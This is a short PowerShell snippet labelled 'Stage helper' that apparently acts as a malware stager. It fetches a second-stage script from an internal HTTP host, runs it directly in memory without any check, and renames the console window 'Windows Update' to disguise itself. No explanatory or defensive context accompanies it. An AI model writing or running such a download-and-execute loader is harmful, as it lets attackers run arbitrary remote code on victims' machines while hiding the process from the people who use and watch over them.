
# Stage helper
$DownloadedScript = (iwr 'http://internal.corp/stage2.ps1' -UseBasicParsing).Content
[ScriptBlock]::Create($DownloadedScript).Invoke()
$Host.UI.RawUI.WindowTitle = "Windows Update"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
